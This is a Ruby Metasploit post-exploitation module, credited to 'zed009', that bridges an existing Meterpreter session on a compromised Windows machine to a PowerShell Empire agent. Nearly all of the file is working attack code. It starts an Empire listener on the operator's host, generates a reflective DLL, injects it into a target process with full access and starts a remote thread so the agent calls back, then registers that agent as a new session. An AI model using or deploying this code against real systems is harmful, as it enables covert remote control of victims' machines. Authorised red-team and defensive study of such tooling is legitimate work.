##
# This module requires Metaspoit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'socket'
require 'resolv-replace'
require 'msf/core/post/windows/reflective_dll_injection'
require 'msf/core/empire_lib'
require 'msf/base/sessions/empire'
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info,
                      "Name"                => "Upgrading to Empire from Meterpreter Post Module",
                      "Description"         => " This module will set up a bridge between the already existing meterpretr session and the Empire instance hosted over the port 1337. Please note that you need to have Empire Web-API preinstalled and running over the default port if you intend to use Empire from Metasploit",
                      "LICENSE"             => MSF_LICENSE,
                      "Platform"            => ["windows"],
                      "SessionTypes"        => ["meterpreter"],
                      "Author"              => ["zed009"]
                     ))
    register_options(
      [
        OptString.new('USERNAME',
                      [true, 'Username passed while initiating Empire-API']),
        OptString.new('PASSWORD',
                     [true, 'Password passed while initiating Empire-API']),
        OptString.new('PathToEmpire',
                      [true, 'The Complete Path to Empire-Web API']),
        OptInt.new('PID',
                   [true,'Process Identifier to inject the Empire payload into'])
      ])
  end
  def run
    #
    #Check for running Empire Instance over port 1337
    #
    command = "netstat -nlt | grep 1337 >> /dev/null"
    value = system(command)
    raise "No Empire Instance Found. Please initiate the Empire API before launching MSF" if not value
    #
    #recurrsive method to generate an open port number
    #
    def gen_port()
      port_number = rand(2000..62000)
      command = "netstat -nlt | grep #{port_number}"
      value = system(command)
      if value
        gen_port()
      else
        return port_number
      end
    end
    #
    #Trying to get localhost from the framework
    #
    if framework.datastore['LHOST']
      @host = framework.datastore['LHOST']
    else
      ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
      @host = ip.ip_address
    end
    #
    #Trying to allot open port
    #
    @port = gen_port()
    #
    #Storing user inputs
    #
    @path = datastore['PathToEmpire'].to_s.chomp
    @pid = datastore['PID'].to_i
    @empire_username = datastore['USERNAME']
    @empire_password = datastore['PASSWORD']
    #
    #Assigning temporary listener name
    #
    @listener_name = "ListenerEmpire#{rand(200..600)}"

    #
    #Main function. This function handles all the interaction with the
    #Empire-API. Any modification to the library shall lead to changes in this
    #method.
    #
    def main

      #Creating Empire Instance
      print_status("Creating Empire Instance")
      client_emp = Msf::Empire::Client.new(@empire_username, @empire_password)
      #Checking listener status
      if client_emp.get_a_listener != false
        @listener_name = client_emp.get_a_listener
        print_status("Listening with listener #{@listener_name}")
      else
        response = client_emp.is_listener_active(@listener_name)
        if response == false
          print_status(client_emp.create_listener(@listener_name, @port, @host))
        else
          print_status(response)
        end
      end

      #Defining the payload path
      payload_path = '/tmp/launcher-emp.dll'

      #Creating Empire DLL
      print_status("Generating reflectively injectable DLL")
      client_emp.generate_dll(@listener_name,'x64',@path)

      #Injecting the created DLL payload reflectively in provided process
      host_process = client.sys.process.open(@pid, PROCESS_ALL_ACCESS)
      print_status("Injecting #{payload_path} into #{@pid}")
      dll_mem, offset = inject_dll_into_process(host_process, payload_path)
      print_status("DLL Injected. Executing Reflective loader")
      host_process.thread.create(dll_mem + offset, 0)
      print_status("DLL injected and invoked")
      print_status("Waiting for incoming agents")

      #Fetching the agent at an interval of 10 seconds.
      sleep(7)
      agents = client_emp.get_agents
      agents.each do |listener, session_id|
        if listener == @listener_name
          @agent_name = session_id.to_s
          print_status("Agent Connected : #{session_id} to listener : #{@listener_name}")
        end
      end

      #Register a Windows Session
      empire_session = Msf::Sessions::EmpireShellWindows.new(client_emp, @agent_name)
      framework.sessions.register(empire_session)
      print_status("Empire Session created")

    end

    main()

  end
end


